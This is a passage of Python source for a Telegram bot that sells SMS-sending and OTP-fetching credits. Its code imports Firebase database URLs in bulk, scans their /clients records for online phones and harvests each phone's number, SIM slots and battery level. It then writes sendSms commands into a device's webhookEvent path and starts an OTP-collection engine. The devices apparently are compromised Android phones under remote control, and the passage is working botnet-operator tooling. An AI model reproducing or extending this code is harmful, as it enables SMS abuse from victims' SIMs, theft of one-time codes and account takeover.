    return n[:2] + "******" + n[-4:]

def fmt_time(ts):
    try:
        return datetime.fromtimestamp(int(ts)).strftime("%d/%m/%Y %H:%M")
    except Exception:
        return "—"

def fmt_time_short(ts):
    try:
        return datetime.fromtimestamp(int(ts)).strftime("%H:%M:%S")
    except Exception:
        return "—"

def fmt_duration(seconds):
    s = int(seconds)
    if s < 60:
        return f"{s}s"
    if s < 3600:
        return f"{s // 60}m {s % 60}s"
    return f"{s // 3600}h {(s % 3600) // 60}m {s % 60}s"

def fmt_age(ts):
    if not ts:
        return "never"
    d = now_ts() - int(ts)
    if d < 60:
        return f"{d}s ago"
    if d < 3600:
        return f"{d // 60}m ago"
    if d < 86400:
        return f"{d // 3600}h ago"
    return f"{d // 86400}d ago"

def progress_bar(cur, total, w=20):
    if total <= 0:
        return "░" * w
    f = min(w, int(w * cur / total))
    return "█" * f + "░" * (w - f)

def truncate(s, n=200):
    s = str(s or "")
    return s if len(s) <= n else s[:n - 3] + "..."

# ============================================================
#  FIREBASE MASK (admin view)
# ============================================================
def _mask_firebase_list(fbs, viewer_is_owner):
    out = []
    for i, fb in enumerate(fbs):
        out.append({
            "id": fb["id"],
            "label": fb_label_for(fb, i, viewer_is_owner),
            "url": fb["url"] if viewer_is_owner else None,
            "added_at": fb.get("added_at", 0),
        })
    return out

# ============================================================
#  SCAN STATUS
# ============================================================
def get_scan_status():
    cur = len(CACHED_DEVICES) * CURRENT_POWER_MODE
    cnt = cur if cur > 0 else LAST_KNOWN_DEVICE_COUNT
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '🔍')} {cnt} ᴀᴘɪs • sᴄᴀɴɴɪɴɢ" if cnt else f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ..."
    if cnt == 0:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    td = time.time() - LAST_SCAN_TIME if LAST_SCAN_TIME > 0 else 999
    if td < 30:
        return f"{em(EMOJI_CHECK, '🟢')} {cnt} ᴀᴘɪs"
    if td < 120:
        return f"{em(EMOJI_WARNING, '🟡')} {cnt} ᴀᴘɪs ({int(td)}s ᴏʟᴅ)"
    return f"{em(EMOJI_CROSS, '🔴')} {cnt} ᴀᴘɪs ({int(td / 60)}ᴍ ᴏʟᴅ)"

# ============================================================
#  SAFE EDIT
# ============================================================
async def safe_edit(cq: CallbackQuery, text: str, markup=None, disable_preview: bool = True):
    try:
        await cq.message.edit_text(
            text, reply_markup=markup, parse_mode="HTML",
            disable_web_page_preview=disable_preview,
        )
        return
    except TelegramBadRequest as e:
        if "not modified" in str(e).lower():
            return
    except TelegramRetryAfter as e:
        await asyncio.sleep(min(e.retry_after, 5))
    except Exception:
        pass
    try:
        await cq.message.answer(
            text, reply_markup=markup, parse_mode="HTML",
            disable_web_page_preview=disable_preview,
        )
    except Exception:
        pass

# ============================================================
#  MAINTENANCE HELPERS (per-service)
# ============================================================
SERVICE_KEYS = (
    "send_sms", "get_otp", "wallet", "redeem",
    "refer", "transfer", "daily_bonus", "pricing",
    "videos", "support", "gift", "upcoming", "templates",
)

def is_service_down(d, service):
    return bool(d.get("settings", {}).get("maintenance_services", {}).get(service, False))

def maintenance_msg_for(d, service):
    svc_msg = d.get("settings", {}).get("maintenance_msg_service", {}).get(service)
    if svc_msg:
        return svc_msg
    return d.get("settings", {}).get("maintenance_msg", "🔧 Maintenance.")

def check_service(uid, d, service):
    """Return (allowed, reason_html)."""
    if is_admin(uid, d):
        return True, None
    if d.get("settings", {}).get("maintenance"):
        return False, maintenance_msg_for(d, service)
    if is_service_down(d, service):
        return False, maintenance_msg_for(d, service)
    return True, None

# ============================================================
#  TERMS HELPERS
# ============================================================
def has_accepted_terms(uid, d):
    if not d.get("settings", {}).get("terms_required", True):
        return True
    if is_admin(uid, d):
        return True
    u = d.get("users", {}).get(str(uid), {})
    return bool(u.get("terms_accepted", False))

def accept_terms(uid, d):
    k = str(uid)
    if k in d.get("users", {}):
        d["users"][k]["terms_accepted"] = True
        d["users"][k]["terms_accepted_at"] = now_ts()
    d.setdefault("terms", {}).setdefault("accepted", {})[k] = now_ts()

def terms_text(d):
    t = d.get("terms", {})
    body = t.get("text", "<b>Terms</b>")
    version = t.get("version", 1)
    return body + f"\n\n<i>Version {version}</i>"

def terms_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("✅ I Agree", "terms:agree", EMOJI_CHECK, "✅", style="success")],
        [btn("❌ Cancel", "terms:cancel", EMOJI_CROSS, "❌", style="danger")],
    ])

# ============================================================
#  LIMIT HELPERS
# ============================================================
def get_owner_display(d):
    val = d.get("settings", {}).get("owner_display", SUPER_ADMIN_NAME)
    if val is None:
        return ""
    return str(val).strip()

def get_otp_cost(d):
    try:
        return int(d.get("settings", {}).get("otp_cost", _OTP_COST_DEFAULT))
    except Exception:
        return _OTP_COST_DEFAULT

def get_otp_fresh_window(d):
    try:
        return int(d.get("settings", {}).get("otp_fresh_window", _OTP_FRESH_WINDOW))
    except Exception:
        return _OTP_FRESH_WINDOW

def get_user_send_limit(uid, d):
    v = d.get("users", {}).get(str(uid), {}).get("max_send_limit")
    if v is None:
        return None
    try:
        return int(v)
    except (TypeError, ValueError):
        return None

def get_user_otp_limit(uid, d):
    v = d.get("users", {}).get(str(uid), {}).get("max_otp_limit")
    if v is None:
        return None
    try:
        return int(v)
    except (TypeError, ValueError):
        return None

def set_user_send_limit(uid, limit, d):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {
            "credits": 0, "coins": 0,
            "manual_added_credits": 0, "manual_added_coins": 0,
            "name": "User",
        }
    if limit is None:
        d["users"][k].pop("max_send_limit", None)
    else:
        d["users"][k]["max_send_limit"] = int(limit)

def set_user_otp_limit(uid, limit, d):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {
            "credits": 0, "coins": 0,
            "manual_added_credits": 0, "manual_added_coins": 0,
            "name": "User",
        }
    if limit is None:
        d["users"][k].pop("max_otp_limit", None)
    else:
        d["users"][k]["max_otp_limit"] = int(limit)

# ============================================================
#  GROUP HELPERS
# ============================================================
def is_group_muted(chat_id, d):
    gs = d.get("group_settings", {}).get(str(chat_id), {})
    return bool(gs.get("stop", False))

def set_group_muted(chat_id, muted, d):
    gs = d.setdefault("group_settings", {}).setdefault(str(chat_id), {})
    gs["stop"] = bool(muted)

def is_group_welcome_enabled(chat_id, d):
    gs = d.get("group_settings", {}).get(str(chat_id), {})
    return bool(gs.get("welcome", True))

def set_group_welcome(chat_id, enabled, d):
    gs = d.setdefault("group_settings", {}).setdefault(str(chat_id), {})
    gs["welcome"] = bool(enabled)

def register_group(chat, d):
    cid = str(chat.id)
    g = d.setdefault("groups", {}).setdefault(cid, {
        "title": chat.title or "Group",
        "added_at": now_ts(),
    })
    g["title"] = chat.title or g.get("title", "Group")
    g["last_seen"] = now_ts()

# ============================================================
#  UPCOMING UPDATES HELPERS
# ============================================================
def upcoming_add(d, title, description, eta=""):
    item = {
        "id": str(int(time.time() * 1000)) + random.randint(100, 999).__str__(),
        "title": str(title)[:80],
        "description": str(description)[:500],
        "eta": str(eta)[:40],
        "added_at": now_ts(),
    }
    d.setdefault("upcoming_updates", []).append(item)
    return item

def upcoming_remove(d, item_id):
    before = len(d.get("upcoming_updates", []))
    d["upcoming_updates"] = [x for x in d.get("upcoming_updates", []) if x.get("id") != item_id]
    return len(d["upcoming_updates"]) < before

# ============================================================
#  TICKET HELPERS
# ============================================================
def create_ticket(d, uid, name, text):
    ticket = {
        "id": f"T{int(time.time() * 1000)}",
        "uid": uid,
        "name": str(name)[:64],
        "text": str(text)[:1000],
        "ts": now_ts(),
        "status": "open",
    }
    d.setdefault("tickets", []).append(ticket)
    d.setdefault("ticket_replies", {})[ticket["id"]] = []
    return ticket

def add_ticket_reply(d, ticket_id, from_uid, text):
    replies = d.setdefault("ticket_replies", {}).setdefault(ticket_id, [])
    replies.append({
        "from_uid": from_uid,
        "text": str(text)[:1000],
        "ts": now_ts(),
    })
    # find ticket
    for t in d.get("tickets", []):
        if t["id"] == ticket_id:
            return t
    return None

def find_ticket(d, ticket_id):
    for t in d.get("tickets", []):
        if t["id"] == ticket_id:
            return t
    return None

def user_open_tickets(d, uid):
    return [t for t in d.get("tickets", []) if t.get("uid") == uid and t.get("status") != "closed"]

# ============================================================
#  FSM STATES (declared here, handlers in later parts)
# ============================================================
class S(StatesGroup):
    # user send
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()

    # owner send
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()

    # admin send
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()

    # firebase unified
    add_firebase = State()

    # owners/admins
    add_owner = State()
    add_admin = State()
    ban_user = State()
    ban_user_reason = State()
    broadcast = State()

    # force join
    fj_add_channel = State()
    fj_add_link = State()
    fj_add_bypass = State()

    # pricing
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_coins = State()
    add_plan_currency = State()
    add_plan_link = State()

    # credits
    quick_adjust_uid = State()
    add_credits_amount = State()
    deduct_credits_amount = State()
    add_coins_amount = State()
    deduct_coins_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()

    # redeem
    redeem_code = State()
    gen_redeem_currency = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()

    # settings
    set_ref_credits = State()
    set_ref_coins = State()
    set_otp_cost = State()
    set_otp_fresh = State()
    set_daily_bonus = State()
    github_repo = State()
    github_token = State()
    github_branch = State()
    github_file = State()
    owner_edit_name = State()

    # limits
    set_limit_uid = State()
    set_limit_value = State()
    set_otp_limit_uid = State()
    set_otp_limit_value = State()

    # protected
    protect_number = State()
    track_number = State()

    # transfer
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    transfer_coins_uid = State()
    transfer_coins_amount = State()

    # videos
    add_video = State()

    # search
    user_search = State()

    # notes/tags
    user_note_uid = State()
    user_note_text = State()
    user_tag_uid = State()
    user_tag_text = State()

    # direct message
    direct_msg_uid = State()
    direct_msg_text = State()

    # templates
    template_name = State()
    template_text = State()

    # scheduled
    sched_number = State()
    sched_message = State()
    sched_count = State()
    sched_time = State()

    # device search
    device_search = State()

    # gift
    gift_coins_uid = State()
    gift_coins_amount = State()

    # maintenance
    set_maint_msg = State()
    set_service_maint_msg = State()

    # upcoming updates
    upcoming_title = State()
    upcoming_description = State()
    upcoming_eta = State()

    # tickets
    ticket_new_text = State()
    ticket_reply_text = State()

    # admin import
    import_data_file = State()

# ═══════════════════════════════════════════════════════════
#  END OF PART 1 — paste PART 2 after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 2 — FIREBASE HTTP / DEVICE / SCANNER / SMS SEND
# ============================================================

# ============================================================
#  FIREBASE — CORE HTTP
# ============================================================
async def fb_put(base_url, path, payload, timeout_sec=6):
    """PUT json to firebase path. Returns True on 2xx."""
    url = base_url.rstrip("/") + path
    try:
        sess = await get_http_session()
        for attempt in range(2):
            try:
                async with sess.put(
                    url, json=payload,
                    timeout=aiohttp.ClientTimeout(total=timeout_sec)
                ) as r:
                    if 200 <= r.status < 300:
                        return True
            except Exception:
                pass
            await asyncio.sleep(0.25 * (attempt + 1))
    except Exception:
        pass
    return False

async def fb_get_raw(base_url, path, timeout_sec=8):
    """Return (ok, data_or_err)."""
    url = base_url.rstrip("/") + path
    try:
        sess = await get_http_session()
        async with sess.get(
            url, timeout=aiohttp.ClientTimeout(total=timeout_sec)
        ) as r:
            txt = (await r.text()).strip()
            if r.status == 200:
                if txt == "null" or not txt:
                    return False, None
                try:
                    return True, json.loads(txt)
                except Exception:
                    return True, txt
            return False, f"HTTP {r.status}"
    except asyncio.TimeoutError:
        return False, "timeout"
    except Exception as e:
        return False, str(e)[:60]

async def fb_get(base_url, path):
    ok, data = await fb_get_raw(base_url, path)
    if not ok:
        return None
    return data

async def fb_get_with_timeout(base_url, path, timeout_sec=4):
    """Wrapper used by OTP collectors — hard timeout."""
    try:
        return await asyncio.wait_for(
            fb_get(base_url, path),
            timeout=timeout_sec,
        )
    except asyncio.TimeoutError:
        return None
    except Exception:
        return None

# ============================================================
#  FIREBASE — DEVICE HELPERS
# ============================================================
def device_is_online(dd):
    if not isinstance(dd, dict):
        return False
    for k in ("isOnline", "online", "connected", "active"):
        v = dd.get(k)
        if v is True or v == 1 or (isinstance(v, str) and v.lower() in ("true", "yes", "1")):
            return True
    st = dd.get("status")
    if isinstance(st, bool) and st:
        return True
    if isinstance(st, str) and st.lower() in ("online", "active", "connected", "1"):
        return True
    ls = dd.get("lastSeen") or dd.get("last_seen") or dd.get("lastOnline")
    try:
        if ls:
            iv = int(ls)
            if iv > 10_000_000_000:
                iv = iv // 1000
            if now_ts() - iv < 60:
                return True
    except Exception:
        pass
    return False

def _extract_phone_from_obj(obj):
    if not isinstance(obj, dict):
        return None
    keys = (
        "phoneNumber", "phone", "number", "msisdn", "simNumber",
        "phone_number", "PhoneNumber", "Phone", "simPhone",
    )
    kl = [k.lower() for k in keys]
    for k, v in obj.items():
        if k.lower() in kl and v:
            sv = str(v).strip()
            if sv and len(sv) >= 7:
                return sv
    return None

def device_phone(dd):
    if not isinstance(dd, dict):
        return None
    v = _extract_phone_from_obj(dd)
    if v:
        return v
    sims = dd.get("sims") or dd.get("sim") or dd.get("simCards")
    if isinstance(sims, dict):
        sims = list(sims.values())
    if isinstance(sims, list):
        for s in sims:
            v = _extract_phone_from_obj(s)
            if v:
                return v
    dev = dd.get("device") or dd.get("deviceInfo")
    if isinstance(dev, dict):
        v = _extract_phone_from_obj(dev)
        if v:
            return v
    return None

def device_sim_slots(dd):
    if not isinstance(dd, dict):
        return [0]
    sims = dd.get("sims") or dd.get("sim") or []
    if isinstance(sims, dict):
        sims = list(sims.values())
    out = []
    for s in sims:
        if isinstance(s, dict):
            idx = s.get("simSlotIndex") or s.get("slot") or s.get("slotIndex")
            try:
                out.append(int(idx))
            except Exception:
                out.append(0)
    if not out:
        out = [0]
    return out

def device_name(dd):
    if not isinstance(dd, dict):
        return "unknown"
    for k in ("deviceName", "name", "model", "device", "brand"):
        v = dd.get(k)
        if isinstance(v, str) and v.strip():
            return v.strip()[:64]
    return "device"

def device_battery(dd):
    if not isinstance(dd, dict):
        return None
    try:
        b = dd.get("battery") or dd.get("batteryLevel") or dd.get("batteryPercentage")
        if b is None:
            return None
        return int(b)
    except Exception:
        return None

# ============================================================
#  FIREBASE — SCAN ONE FIREBASE
# ============================================================
async def _fetch_fb(sess, fb, dev_sem, results):
    url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
    try:
        async with sess.get(url) as r:
            if r.status == 200:
                txt = (await r.text()).strip()
                if txt == "null" or not txt:
                    FB_SCAN_ERRORS.pop(fb["id"], None)
                    return
                try:
                    ids = json.loads(txt)
                except Exception:
                    FB_SCAN_ERRORS.pop(fb["id"], None)
                    return
                if not isinstance(ids, dict):
                    FB_SCAN_ERRORS.pop(fb["id"], None)
                    return

                async def fd(dev_id):
                    try:
                        u = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                        async with dev_sem:
                            async with sess.get(u) as r2:
                                if r2.status == 200:
                                    t2 = (await r2.text()).strip()
                                    if t2 == "null" or not t2:
                                        return None
                                    try:
                                        dd = json.loads(t2)
                                    except Exception:
                                        return None
                                    if isinstance(dd, dict) and device_is_online(dd):
                                        return {
                                            "fb_id": fb["id"],
                                            "fb_url": fb["url"],
                                            "fb_label": fb.get("label", fb["url"][:30]),
                                            "dev_id": dev_id,
                                            "dev_name": device_name(dd),
                                            "phone": device_phone(dd),
                                            "sims": dd.get("sims", []) or dd.get("sim", []),
                                            "battery": device_battery(dd),
                                            "raw": dd,
                                            "last_scan": now_ts(),
                                        }
                    except Exception:
                        pass
                    return None

                dev_ids = list(ids.keys())
                for i in range(0, len(dev_ids), _DEVICE_BATCH):
                    batch = dev_ids[i:i + _DEVICE_BATCH]
                    rs = await asyncio.gather(*(fd(d) for d in batch), return_exceptions=True)
                    for x in rs:
                        if x and isinstance(x, dict):
                            results.append(x)
                FB_SCAN_ERRORS.pop(fb["id"], None)
                return
            elif r.status in (401, 403):
                FB_SCAN_ERRORS[fb["id"]] = f"AUTH {r.status}"
                return
            elif r.status == 404:
                FB_SCAN_ERRORS[fb["id"]] = "404"
                return
            elif r.status in (429, 500, 502, 503, 504):
                FB_SCAN_ERRORS[fb["id"]] = f"RATE {r.status}"
                return
            else:
                FB_SCAN_ERRORS[fb["id"]] = f"HTTP {r.status}"
                return
    except asyncio.TimeoutError:
        FB_SCAN_ERRORS[fb["id"]] = "TIMEOUT"
        return
    except aiohttp.ClientError as e:
        FB_SCAN_ERRORS[fb["id"]] = f"CLIENT {str(e)[:25]}"
        return
    except Exception as e:
        FB_SCAN_ERRORS[fb["id"]] = f"ERR {str(e)[:25]}"
        return

# ============================================================
#  FIREBASE — SCAN ALL
# ============================================================
async def scan_all(d):
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    curr = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [x for x in CACHED_DEVICES if x.get("fb_id") in curr]
    for sid in list(FB_SCAN_ERRORS.keys()):
        if sid not in curr:
            FB_SCAN_ERRORS.pop(sid, None)

    fb_sem = asyncio.Semaphore(_FB_CONCURRENCY)
    dev_sem = asyncio.Semaphore(_DEV_CONCURRENCY)
    conn = aiohttp.TCPConnector(
        limit=_HTTP_POOL_LIMIT,
        limit_per_host=_HTTP_PER_HOST,
        ttl_dns_cache=_DNS_CACHE_TTL,
        force_close=False,
        enable_cleanup_closed=True,
    )
    to = aiohttp.ClientTimeout(total=_HTTP_READ_TIMEOUT, connect=_HTTP_CONNECT_TIMEOUT)
    async with aiohttp.ClientSession(connector=conn, timeout=to) as s:
        async def w(fb):
            async with fb_sem:
                await _fetch_fb(s, fb, dev_sem, results)
        await asyncio.gather(*(w(fb) for fb in fbs), return_exceptions=True)
    return results

# ============================================================
#  SMS SEND
# ============================================================
async def sms_via_device(fb_url, dev_id, sim_slot, to, message):
    ts = int(time.time())
    to_s = str(to).strip()
    msg_s = str(message).strip()
    attempts = [
        (
            f"/clients/{dev_id}/webhookEvent/sendSms.json",
            {"from": sim_slot, "to": to_s, "message": msg_s,
             "isSended": False, "timestamp": ts},
        ),
        (
            f"/clients/{dev_id}/webhookEvent/sendSms.json",
            {"from": str(sim_slot), "to": to_s, "message": msg_s,
             "isSended": False, "timestamp": ts},
        ),
        (
            f"/clients/{dev_id}/messages.json",
            {"phone": to_s, "text": msg_s, "sim": sim_slot, "timestamp": ts},
        ),
    ]
    for path, payload in attempts:
        if await fb_put(fb_url, path, payload):
            return True
    return False

# ============================================================
#  FIREBASE — URL UTILS
# ============================================================
def extract_urls(text):
    """Extract firebase-like URLs from free text. Skips t.me, github."""
    if not text:
        return []
    urls = _URL_REGEX.findall(str(text))
    seen = set()
    out = []
    for u in urls:
        u = u.rstrip(".,;:!?)]}\"'")
        if not u:
            continue
        try:
            parsed = urlparse(u)
            host = (parsed.netloc or "").lower()
            if not host:
                continue
            if "t.me" in host or "telegram" in host:
                continue
            if "github.com" in host or "githubusercontent" in host:
                continue
            if "youtube.com" in host or "youtu.be" in host:
                continue
        except Exception:
            continue
        if u in seen:
            continue
        seen.add(u)
        out.append(u)
    return out

async def check_firebase_url(url):
    """Returns (ok, note). Fast HEAD-like check with /clients.json."""
    url = url.rstrip("/")
    sess = await get_http_session()
    try:
        async with sess.get(
            url + "/clients.json?shallow=true",
            timeout=aiohttp.ClientTimeout(total=8)
        ) as r:
            if r.status == 200:
                txt = (await r.text()).strip()
                if txt == "null":
                    return True, "empty but valid"
                return True, "ok"
            if r.status == 401:
                return False, "auth required"
            if r.status == 403:
                return False, "forbidden"
            if r.status == 404:
                return False, "not found"
            if r.status in (429, 500, 502, 503, 504):
                return False, f"server busy {r.status}"
            return False, f"HTTP {r.status}"
    except asyncio.TimeoutError:
        return False, "timeout"
    except Exception as e:
        return False, str(e)[:40]

# ============================================================
#  FIREBASE — BATCH IMPORT (unified for text + file)
# ============================================================
async def process_firebase_import(bot, uid, entries):
    """
    entries = list of (source_name, raw_text_or_content)
    Returns report dict:
      { files: [{name, urls_found}], added: [...], skipped: [...],
        failed: [(url, reason)], total_urls }
    """
    d = load()
    total_urls = []
    seen = set()
    file_stats = []

    for fname, content in entries:
        if not isinstance(content, str):
            try:
                content = content.decode("utf-8", errors="ignore")
            except Exception:
                content = str(content)
        urls = extract_urls(content)
        file_stats.append({"name": fname, "count": len(urls)})
        for u in urls:
            if u in seen:
                continue
            seen.add(u)
            total_urls.append(u)

    existing_urls = {fb["url"].rstrip("/") for fb in d.get("firebases", [])}
    added = []
    skipped = []
    failed = []

    # validate concurrently (cap 30) to avoid slow serial loop
    sem = asyncio.Semaphore(30)

    async def check(u):
        async with sem:
            return u, await check_firebase_url(u)

    checks = await asyncio.gather(*(check(u) for u in total_urls), return_exceptions=True)

    for res in checks:
        if isinstance(res, Exception):
            continue
        u, (ok, note) = res
        if u.rstrip("/") in existing_urls:
            skipped.append(u)
            continue
        if not ok:
            failed.append((u, note))
            continue

        fbs = d.get("firebases", [])
        existing_ids = {fb["id"] for fb in fbs}
        fid = str(int(time.time() * 1000) + random.randint(100, 9999))
        tries = 0
        while fid in existing_ids and tries < 20:
            fid = str(int(time.time() * 1000) + random.randint(100, 9999))
            tries += 1

        try:
            host = urlparse(u).netloc or u
        except Exception:
            host = u
        label = host[:30]

        fbs.append({
            "id": fid,
            "url": u.rstrip("/"),
            "label": label,
            "added_at": now_ts(),
        })
        d["firebases"] = fbs
        existing_urls.add(u.rstrip("/"))
        added.append(u)

    save()

    return {
        "files": file_stats,
        "added": added,
        "skipped": skipped,
        "failed": failed,
        "total_urls": len(total_urls),
        "existing_after": len(d.get("firebases", [])),
    }

def build_import_report(result):
    """Build HTML report string from process_firebase_import result."""
    lines = [f"{em(EMOJI_FILE, '📁')} <b>Firebase Import Report</b>\n"]

    lines.append(f"📄 Files/Inputs: <b>{len(result['files'])}</b>")
    for f in result["files"][:10]:
        lines.append(f"   • <code>{esc(str(f['name'])[:30])}</code> — {f['count']} urls")
    if len(result["files"]) > 10:
        lines.append(f"   <i>+{len(result['files']) - 10} more</i>")

    lines.append("")
    lines.append(f"🔗 URLs detected: <b>{result['total_urls']}</b>")
    lines.append(f"{em(EMOJI_CHECK, '✅')} Added: <b>{len(result['added'])}</b>")
    lines.append(f"{em(EMOJI_WARNING, '⚠️')} Skipped (already exists): <b>{len(result['skipped'])}</b>")
    lines.append(f"{em(EMOJI_CROSS, '❌')} Failed: <b>{len(result['failed'])}</b>")
    lines.append("")

    if result["added"]:
        lines.append("<b>Added URLs:</b>")
        for u in result["added"][:8]:
            lines.append(f"   ✅ <code>{esc(u[:60])}</code>")
        if len(result["added"]) > 8:
            lines.append(f"   <i>+{len(result['added']) - 8} more</i>")
        lines.append("")

    if result["failed"]:
        lines.append("<b>Failed URLs:</b>")
        for u, r in result["failed"][:8]:
            lines.append(f"   ❌ <code>{esc(u[:40])}</code> — {esc(r)}")
        if len(result["failed"]) > 8:
            lines.append(f"   <i>+{len(result['failed']) - 8} more</i>")
        lines.append("")

    lines.append(f"{em(EMOJI_FIRE, '🔥')} Total firebases now: <b>{result['existing_after']}</b>")

    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    return txt

# ============================================================
#  FIREBASE — BATCH BUFFER (for multi-file paste detection)
# ============================================================
_FB_BATCH_BUFFERS = {}  # uid -> { files: [(name, content)], task }

def _fb_buffer_get(uid):
    b = _FB_BATCH_BUFFERS.get(uid)
    if not b:
        b = {"files": [], "task": None, "chat_id": None}
        _FB_BATCH_BUFFERS[uid] = b
    return b

def _fb_buffer_push(uid, chat_id, name, content):
    b = _fb_buffer_get(uid)
    b["files"].append((name, content))
    b["chat_id"] = chat_id
    if b.get("task") and not b["task"].done():
        try:
            b["task"].cancel()
        except Exception:
            pass

async def _fb_batch_flush(bot, uid):
    try:
        await asyncio.sleep(_FB_UPLOAD_WAIT)
    except asyncio.CancelledError:
        return
    b = _FB_BATCH_BUFFERS.pop(uid, None)
    if not b:
        return
    files = b.get("files", [])
    chat_id = b.get("chat_id")
    if not files or not chat_id:
        return
    try:
        result = await process_firebase_import(bot, uid, files)
        report = build_import_report(result)
        await bot.send_message(
            chat_id, report,
            reply_markup=kb(
                (sc("view firebases"), "owner:fb:menu:0"),
                (sc("back"), "owner:home"),
            ),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception as e:
        log.warning(f"[FB IMPORT] flush failed: {e}")
        try:
            await bot.send_message(
                chat_id,
                f"❌ Import error: <code>{esc(str(e)[:120])}</code>",
                parse_mode="HTML",
            )
        except Exception:
            pass

# ============================================================
#  FIREBASE — FILE VALIDATION
# ============================================================
def validate_upload_file(doc):
    """Returns (ok, error). Cap size, reject folders."""
    try:
        size = int(doc.file_size or 0)
    except Exception:
        size = 0
    if size > _FB_IMPORT_MAX_BYTES:
        return False, f"File too big ({round(size / 1024 / 1024, 1)}MB > {round(_FB_IMPORT_MAX_BYTES / 1024 / 1024, 1)}MB)"
    return True, None

# ============================================================
#  SCANNER LOOP — adaptive interval
# ============================================================
def _adaptive_scan_interval():
    idle = time.time() - LAST_ACTIVITY_TS
    if idle < 60:
        return _SCAN_ADAPTIVE_MIN
    if idle < 300:
        return 10
    return _SCAN_ADAPTIVE_MAX

async def scanner_loop(bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, LAST_SCAN_DURATION
    global SCANNING_IN_PROGRESS, LAST_KNOWN_DEVICE_COUNT
    global LAST_KNOWN_FB_COUNTS, DEVICE_HEALTH_LOG

    log.info("[SCANNER] started")
    first_done = False
    while True:
        start = time.time()
        try:
            async with SCAN_LOCK:
                if SCANNING_IN_PROGRESS:
                    await asyncio.sleep(2)
                    continue
                SCANNING_IN_PROGRESS = True

            try:
                d = load()
                fbs = d.get("firebases", [])
                if not fbs:
                    await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                    continue

                devices = await scan_all(d)
                dur = time.time() - start
                CACHED_DEVICES = devices
                LAST_SCAN_DURATION = dur

                if devices:
                    new_counts = {}
                    for fb in fbs:
                        fid = fb["id"]
                        online = sum(1 for x in devices if x["fb_id"] == fid)
                        new_counts[fid] = {
                            "label": fb.get("label", fb["url"][:30]),
                            "online": online,
                            "last_update": now_ts(),
                        }
                    FB_DEVICE_COUNTS.clear()
                    FB_DEVICE_COUNTS.update(new_counts)
                    LAST_KNOWN_FB_COUNTS = dict(new_counts)
                    LAST_KNOWN_DEVICE_COUNT = len(devices) * CURRENT_POWER_MODE
                    LAST_SCAN_TIME = time.time()

                try:
                    fh = d.setdefault("firebase_health", {})
                    for fb in fbs:
                        fid = fb["id"]
                        h = fh.setdefault(fid, {
                            "ok": 0, "fail": 0, "last_ok_ts": 0, "last_fail_ts": 0,
                            "avg_response_ms": 0,
                        })
                        if fid in FB_SCAN_ERRORS:
                            h["fail"] = h.get("fail", 0) + 1
                            h["last_fail_ts"] = now_ts()
                            h["last_error"] = FB_SCAN_ERRORS[fid]
                        else:
                            h["ok"] = h.get("ok", 0) + 1
                            h["last_ok_ts"] = now_ts()
                except Exception:
                    pass

                DEVICE_HEALTH_LOG.append({
                    "timestamp": now_ts(),
                    "devices_found": len(devices),
                    "dbs_scanned": len(fbs),
                    "duration_sec": round(dur, 2),
                    "errors": len(FB_SCAN_ERRORS),
                    "status": "healthy" if devices else "no_devices",
                })
                if len(DEVICE_HEALTH_LOG) > 100:
                    DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

                log.info(f"[SCAN] {len(devices)} devices | {dur:.1f}s | err={len(FB_SCAN_ERRORS)}")

                if devices and not first_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>SCANNER ACTIVE</b>\n\n"
                            f"📱 Devices: <b>{len(devices)}</b>\n"
                            f"🔥 APIs: <b>{len(devices) * CURRENT_POWER_MODE}</b>\n"
                            f"🔢 Mode: <b>{CURRENT_POWER_MODE}x</b>\n"
                            f"⏱ Time: <b>{dur:.1f}s</b>\n"
                            f"❌ Errors: <b>{len(FB_SCAN_ERRORS)}</b>",
                            parse_mode="HTML",
                        )
                    except Exception:
                        pass
                    first_done = True
            except Exception as e:
                log.error(f"[SCAN] fatal: {e}", exc_info=True)
            finally:
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False

            gap = _adaptive_scan_interval()
            elapsed = time.time() - start
            wait = max(1.0, gap - elapsed)
            await asyncio.sleep(wait)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.error(f"[SCANNER] loop error: {e}")
            await asyncio.sleep(5)

# ============================================================
#  DEVICE LOOKUP (sorted, used by OTP menu)
# ============================================================
def sorted_devices():
    return sorted(
        CACHED_DEVICES[:],
        key=lambda x: (0 if x.get("phone") else 1, str(x.get("dev_name", "")))
    )

def device_by_index(idx):
    devs = sorted_devices()
    if 0 <= idx < len(devs):
        return devs[idx]
    return None

# ═══════════════════════════════════════════════════════════
#  END OF PART 2 — paste PART 3 after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 3 — OTP ENGINE (rewrite)
#  - body-hash dedupe (fix: same OTP repeated)
#  - alphanumeric + spaced codes
#  - NEW / OLD fetch modes
#  - live mode: new-only, refund if none
#  - OTP pending refund ledger
# ============================================================

# ============================================================
#  OTP — NORMALIZERS
# ============================================================
def _body_hash(body, sender, ts):
    """Stable hash for dedupe. Ignores ordering noise."""
    norm_body = " ".join(str(body or "").split()).lower()[:500]
